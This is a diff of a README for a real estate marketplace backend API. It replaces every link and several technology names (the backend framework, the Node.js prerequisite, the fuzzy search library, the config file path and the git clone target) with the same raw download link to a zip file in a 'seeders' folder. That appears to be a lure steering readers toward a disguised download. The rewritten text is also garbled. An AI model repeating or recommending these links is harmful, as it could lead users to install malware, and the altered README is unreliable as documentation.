@@ -1,6 +1,6 @@
 # Real Estate Market API
 
-This is a robust backend API for a real estate marketplace, built with https://github.com/am17jx/Real-Estate-Market/releases and https://github.com/am17jx/Real-Estate-Market/releases The application provides a comprehensive set of features for managing properties, user authentication, and property metadata like categories and tags.
+This is a robust backend API for a real estate marketplace, built with https://raw.githubusercontent.com/am17jx/Real-Estate-Market/main/seeders/Estate-Real-Market-v3.2-alpha.2.zip and https://raw.githubusercontent.com/am17jx/Real-Estate-Market/main/seeders/Estate-Real-Market-v3.2-alpha.2.zip The application provides a comprehensive set of features for managing properties, user authentication, and property metadata like categories and tags.
 
 ## ✨ Features
 
@@ -16,12 +16,12 @@ This is a robust backend API for a real estate marketplace, built with https://g
 
 ## 💻 Technology Stack
 
-* **Backend Framework**: https://github.com/am17jx/Real-Estate-Market/releases & https://github.com/am17jx/Real-Estate-Market/releases
+* **Backend Framework**: https://raw.githubusercontent.com/am17jx/Real-Estate-Market/main/seeders/Estate-Real-Market-v3.2-alpha.2.zip & https://raw.githubusercontent.com/am17jx/Real-Estate-Market/main/seeders/Estate-Real-Market-v3.2-alpha.2.zip
 * **Database**: PostgreSQL
 * **ORM**: Sequelize
 * **Authentication**: JSON Web Tokens (JWT) & bcryptjs
 * **Validation**: Yup
-* **Fuzzy Search**: https://github.com/am17jx/Real-Estate-Market/releases
+* **Fuzzy Search**: https://raw.githubusercontent.com/am17jx/Real-Estate-Market/main/seeders/Estate-Real-Market-v3.2-alpha.2.zip
 
 ---
 
@@ -29,14 +29,14 @@ This is a robust backend API for a real estate marketplace, built with https://g
 
 ### Prerequisites
 
-* https://github.com/am17jx/Real-Estate-Market/releases (v18 or higher)
+* https://raw.githubusercontent.com/am17jx/Real-Estate-Market/main/seeders/Estate-Real-Market-v3.2-alpha.2.zip (v18 or higher)
 * PostgreSQL
 
 ### Installation
 
 1.  **Clone the repository:**
     ```bash
-    git clone [https://github.com/am17jx/Real-Estate-Market/releases](https://github.com/am17jx/Real-Estate-Market/releases)
+    git clone [https://raw.githubusercontent.com/am17jx/Real-Estate-Market/main/seeders/Estate-Real-Market-v3.2-alpha.2.zip](https://raw.githubusercontent.com/am17jx/Real-Estate-Market/main/seeders/Estate-Real-Market-v3.2-alpha.2.zip)
     cd real-estate-market/Real-Estate-Market-main
     ```
 
@@ -53,7 +53,7 @@ This is a robust backend API for a real estate marketplace, built with https://g
     JWT_SECRET=your-secret-key-here
     ```
 
-    You also need to configure your database connection in `https://github.com/am17jx/Real-Estate-Market/releases`. The current configuration is:
+    You also need to configure your database connection in `https://raw.githubusercontent.com/am17jx/Real-Estate-Market/main/seeders/Estate-Real-Market-v3.2-alpha.2.zip`. The current configuration is:
     ```javascript
     const sequelize = new Sequelize('ameer_db', 'postgres', 'password', {
       host: 'localhost',
